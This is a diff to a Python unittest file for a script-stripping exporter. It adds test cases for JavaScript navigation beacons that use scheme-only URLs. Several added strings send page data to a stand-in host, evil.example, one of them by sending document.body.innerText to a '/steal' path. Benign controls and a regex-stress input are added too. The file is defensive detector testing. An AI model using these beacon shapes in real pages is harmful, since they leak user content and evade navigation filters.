@@ -1285,6 +1285,16 @@ class RuntimeParityTests(unittest.TestCase):
         # JS treats U+FEFF as whitespace; Python's `\\s` does not, so a shared class let this
         # valid-JS beacon be stripped by the exporter yet certified clean by the validator.
         'location.href =\ufeff"https://evil.example"',
+        # A SCHEME-ONLY URL literal - no slashes after the scheme. A browser resolves
+        # `https:evil.example/x` to `https://evil.example/x`, so this beacons exactly as well as
+        # the shapes above while needing no aliasing, no computed access and no runtime assembly.
+        'location.href = "https:evil.example/steal?d=" + document.body.innerText;',
+        "\nlocation = 'https:evil.example';",
+        'window.location.href = "https:evil.example"',
+        'top.location.replace("https:evil.example")',
+        'document.location.assign(`http:evil.example`)',
+        'window.open("https:evil.example/popup")',
+        'const location = {}; window.location.href = "https:evil.example";',
     ]
     # Benign shapes that must SURVIVE. The strip deletes a whole script, so a false positive
     # silently breaks an author's document - the costlier direction of the two.
@@ -1331,6 +1341,14 @@ class RuntimeParityTests(unittest.TestCase):
         # A relative navigation inside the offline file is not egress.
         'location.href = "#section-2";',
         'location.assign("./other.html")',
+        # The false-positive controls for the SCHEME-ONLY widening. A `https:`/`http:` literal is
+        # not a navigation just because it sits near one: a comparison, a plain scheme string, and
+        # a shadowed sink must all still survive.
+        'if (location.href === "https:api.example.org/v1") return;',
+        'var SECURE = "https:"; if (location.protocol === SECURE) document.title = "s";',
+        'const location = { href: "" }; location.href = "https:api.example";',
+        # A relative path that merely CONTAINS a colon is not a scheme.
+        'location.href = "./a:b.html"',
     ]
 
     # The three regex literals the exporter's navigation decision is built from, each paired with
@@ -1501,6 +1519,9 @@ class RuntimeParityTests(unittest.TestCase):
             "window" + " " * 20000 + "X",
             ("window{0}.{0}top{0}.{0}location{0}.{0}href{0}={0}'not-a-url'").format(" " * 400),
             "window . " * 200 + "x",
+            # The URL literal now also accepts a SCHEME-ONLY spelling, so pin the near-miss that
+            # arms that alternation at every sink and never completes it.
+            'location.href = "https' * 2000,
         ]
         for evil in evils:
             start = time.monotonic()
